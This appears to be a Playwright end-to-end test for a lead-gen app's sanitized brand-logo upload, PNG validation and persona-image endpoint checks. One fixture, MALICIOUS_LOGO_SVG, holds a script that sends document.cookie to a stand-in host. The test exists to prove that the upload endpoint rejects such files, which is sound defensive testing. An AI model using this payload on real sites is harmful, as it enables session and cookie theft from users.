// LeadGen Round-4 P5c probe spec (temporary; final consolidation lands in P7).
// Proves the P5c ASSET pipeline END TO END on the REAL served funnel + admin
// API, driven with real requests (ZERO dispatchEvent):
//   * a VALID brand-logo SVG uploads through the SANITIZED endpoint, is served
//     from /media/<key> as sanitized image/svg+xml (comment/PI stripped), and
//     RENDERS as a plain <img class="lg-logo-strip-img"> on the live funnel via
//     P5a's brand_logos element — the SAME <img> element an AI-persona url
//     renders through (so this doubles as the 10G "generated url renders" proof);
//   * a MALICIOUS SVG (<script>) is rejected at upload with a PLAIN-language
//     400 and is NEVER stored;
//   * a raster (PNG) logo passes the image-validation path;
//   * the persona endpoint VALIDATES before any spend (unknown persona -> 400,
//     missing site -> 400). A successful generation is NOT driven here: this
//     live wrangler-dev worker loads OPENAI_API_KEY from .dev.vars, so a valid
//     persona POST would make a REAL, billable OpenAI call — forbidden. The
//     successful-generation mechanics (prompt merge, deterministic R2 key,
//     quota decrement, over-quota 429) are proven with a MOCKED client in
//     test/leadgen-p5c-assets.test.ts.
//
// The P5b "Upload SVG" button in the brand-logos picker is a DISABLED mount in
// ui-quotes.ts (a P5b-owned file); this spec drives the endpoint via the admin
// API. The one-line wiring hook is reported to the conductor.
//
// chromium-only (playwright.config.ts: firefox testMatch is the gesture set;
// this non-gesture spec is picked up by chromium alone, like __p5a-frame). The
// dynamic {uniq}.e2e.test host needs chromium's --host-resolver-rules.

import { test, expect, request as playwrightRequest, type APIRequestContext, type Page } from "@playwright/test";
import { mkdirSync } from "node:fs";
import { seedActiveSite } from "./listicles-p6-seed";
import { seedSharedFirstPage, createPassThroughSection } from "./leadgen-shared-page-seed";
import { PW_PORT } from "./utils/base-url";

test.use({ launchOptions: { args: ["--host-resolver-rules=MAP *.e2e.test 127.0.0.1"] } });

const ORIGIN = `http://127.0.0.1:${PW_PORT}`;
const LG_API = "/api/admin/leadgen";
const SHOT_DIR = "test-artifacts/leadgen-p5c";

async function json<T>(
  res: { ok(): boolean; status(): number; json(): Promise<unknown>; text(): Promise<string> },
  label: string,
): Promise<T> {
  if (!res.ok()) throw new Error(`${label} HTTP ${res.status()}: ${await res.text()}`);
  return (await res.json()) as T;
}

const CONTINUE = { type: "ContinueButton", question_id: "cont", props: { label: "Continue" } };
function yesNoSection(name: string, field: string) {
  return {
    section_name: name,
    headline_text: name,
    content_json: JSON.stringify({
      components: [
        { type: "TwoButtonYesNo", question_id: `q_${field}`, question_key: field, internal_field: field, answer_type: "boolean", required: true },
        CONTINUE,
      ],
    }),
  };
}

interface Seeded {
  host: string;
  slug: string;
  funnelId: string;
}

// Seed an ACTIVE tenant + a single-page funnel carrying the given brand_logos
// frame config, through the REAL admin API (same path P5a uses).
async function seedLogoFunnel(
  request: APIRequestContext,
  brandLogos: Record<string, unknown>,
): Promise<Seeded> {
  const uniq = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const safe = `p5c-${uniq}`;
  const host = `lg-${safe}.e2e.test`;
  const siteId = await seedActiveSite(request, host, `P5c ${uniq}`);
  const quote = await json<{ public_id: string; funnels: Array<{ public_id: string; variants: Array<{ public_id: string }> }> }>(
    await request.post(`${LG_API}/quotes`, { data: { quote_name: `P5c ${uniq}`, activity: "quote_funnel", verticals: ["life"] } }),
    "quote create",
  );
  const funnelId = quote.funnels[0]!.public_id;
  const variantId = quote.funnels[0]!.variants[0]!.public_id;
  const section = await json<{ public_id: string }>(
    await request.post(`${LG_API}/sections`, { data: { activity: "quote_funnel", vertical: "life", status: "active", ...yesNoSection(`${safe}-s1`, "f_p5c_1") } }),
    "section create",
  );
  // Rework §4.3-1: the shared first page is mandatory for activation and resolver.ts
  // composes [...sharedPages, ...variantPages]. The yes/no section IS page 1, so it
  // moves onto the shared page; the variant keeps a trailing pass-through page so the
  // funnel still satisfies "every active funnel needs at least one page with a
  // section". Every assertion here reads the FRAME (brand logos) on page 1.
  await json(
    await request.put(`${LG_API}/variants/${variantId}`, {
      data: { pages: [{ name: "Page 2", slots: [{ kind: "fixed", section_id: await createPassThroughSection(request, `P5c ${uniq}`) }] }] },
    }),
    "variant pages",
  );
  await seedSharedFirstPage(request, quote.public_id, [section.public_id], "Page 1");
  await json(
    await request.put(`${LG_API}/funnels/${funnelId}/frame`, {
      data: { frame_config_json: { version: 1, template: "centered", brand_logos: brandLogos } },
    }),
    "funnel frame",
  );
  await json(
    await request.put(`${LG_API}/quotes/${quote.public_id}/activation/${siteId}`, { data: { enabled: true, slug: safe } }),
    "activation",
  );
  return { host, slug: safe, funnelId };
}

const shellUrl = (s: Seeded) => `http://${s.host}:${PW_PORT}/lg/${s.slug}`;
async function ready(page: Page): Promise<void> {
  await expect(page.locator('#lg-funnel-root[data-lg-ready="1"]')).toHaveCount(1, { timeout: 8_000 });
}

// A valid brand-logo SVG carrying an author comment + <?xml?> PI + NO xmlns —
// the sanitizer must strip the comment/PI and inject xmlns before storage.
const VALID_LOGO_SVG =
  `<?xml version="1.0"?><!-- brand mark --><svg viewBox="0 0 48 24">` +
  `<rect x="0" y="0" width="48" height="24" rx="4" fill="#1a56db"/>` +
  `<text x="6" y="17" font-size="12" fill="#ffffff">ACME</text></svg>`;
const MALICIOUS_LOGO_SVG =
  `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil.example/'+document.cookie)</script></svg>`;
const PNG_1PX = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64",
);

test.beforeAll(() => {
  mkdirSync(SHOT_DIR, { recursive: true });
});

test.describe("P5c — sanitized brand-logo upload + AI-persona asset endpoints", () => {
  let ctx: APIRequestContext;

  test.beforeAll(async () => {
    ctx = await playwrightRequest.newContext({ baseURL: ORIGIN });
  });
  test.afterAll(async () => {
    await ctx.dispose();
  });

  test("valid SVG uploads, is served sanitized, and renders as <img> on the live funnel", async ({ page }) => {
    // Upload through the SANITIZED brand-logo endpoint.
    const up = await json<{ ok: boolean; media_id: number; storage_key: string; url: string; mime_type: string; sanitized: boolean }>(
      await ctx.post(`${LG_API}/assets/brand-logo`, {
        multipart: { file: { name: "acme.svg", mimeType: "image/svg+xml", buffer: Buffer.from(VALID_LOGO_SVG) }, site_id: "p5c-render" },
      }),
      "svg upload",
    );
    expect(up.ok).toBe(true);
    expect(up.sanitized).toBe(true);
    expect(up.mime_type).toBe("image/svg+xml");

    // Served from /media/<key> as sanitized image/svg+xml (comment/PI gone).
    const served = await ctx.get(up.url);
    expect(served.status()).toBe(200);
    expect(served.headers()["content-type"] ?? "").toContain("image/svg+xml");
    const body = await served.text();
    expect(body).not.toContain("<!--");
    expect(body).not.toContain("<?xml");
    expect(body).toContain('xmlns="http://www.w3.org/2000/svg"');

    // Render it on the live funnel via P5a's brand_logos element (media_id =
    // the bare storage key; the renderer resolves it through mediaUrl).
    const seeded = await seedLogoFunnel(ctx, {
      enabled: true,
      layout: "row",
      slot: "above_header",
      items: [{ media_id: up.storage_key, alt: "ACME" }],
    });
    await page.goto(shellUrl(seeded), { waitUntil: "load" });
    await ready(page);
    const img = page.locator(".lg-frame-brand-logos img.lg-logo-strip-img");
    await expect(img).toHaveCount(1);
    await expect(img).toHaveAttribute("src", new RegExp(up.storage_key.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
    // The <img> resource actually loaded (the sanitized SVG is a valid image).
    const loaded = await img.evaluate((el) => (el as HTMLImageElement).complete && (el as HTMLImageElement).naturalWidth > 0);
    expect(loaded, "brand-logo <img> loaded").toBe(true);
    await page.screenshot({ path: `${SHOT_DIR}/svg-logo-renders.png`, fullPage: true });
  });

  test("a malicious SVG is rejected with a plain-language message and never stored", async () => {
    const res = await ctx.post(`${LG_API}/assets/brand-logo`, {
      multipart: { file: { name: "evil.svg", mimeType: "image/svg+xml", buffer: Buffer.from(MALICIOUS_LOGO_SVG) }, site_id: "p5c-evil" },
    });
    expect(res.status()).toBe(400);
    const body = (await res.json()) as { error: string; code: string };
    expect(body.code).toBe("svg_rejected");
    expect(body.error).toMatch(/disallowed element: script/i);
  });

  test("a raster PNG logo passes the image-validation path", async () => {
    const up = await json<{ ok: boolean; mime_type: string; sanitized: boolean }>(
      await ctx.post(`${LG_API}/assets/brand-logo`, {
        multipart: { file: { name: "logo.png", mimeType: "image/png", buffer: PNG_1PX }, site_id: "p5c-raster" },
      }),
      "png upload",
    );
    expect(up.ok).toBe(true);
    expect(up.mime_type).toBe("image/png");
    expect(up.sanitized).toBe(false);
  });

  test("persona endpoint validates BEFORE any spend (zero-cost legs)", async () => {
    // Unknown persona -> 400 before any OpenAI call.
    const unknown = await ctx.post(`${LG_API}/assets/persona-image`, {
      data: { site_id: "p5c-persona", persona_key: "definitely_not_a_persona" },
    });
    expect(unknown.status()).toBe(400);
    const ub = (await unknown.json()) as { code: string; valid_personas: string[] };
    expect(ub.code).toBe("unknown_persona");
    expect(Array.isArray(ub.valid_personas)).toBe(true);
    expect(ub.valid_personas.length).toBeGreaterThanOrEqual(8);

    // Missing site_id -> 400 before any OpenAI call.
    const noSite = await ctx.post(`${LG_API}/assets/persona-image`, { data: { persona_key: "young_woman" } });
    expect(noSite.status()).toBe(400);
    // NOTE: a valid persona POST is intentionally NOT sent — it would make a
    // real billable OpenAI call in this key-loaded dev worker. The success
    // path is proven with a mocked client in test/leadgen-p5c-assets.test.ts,
    // and the "generated url renders" property is proven by the first test
    // (an uploaded media url in the SAME brand_logos <img> element).
  });
});
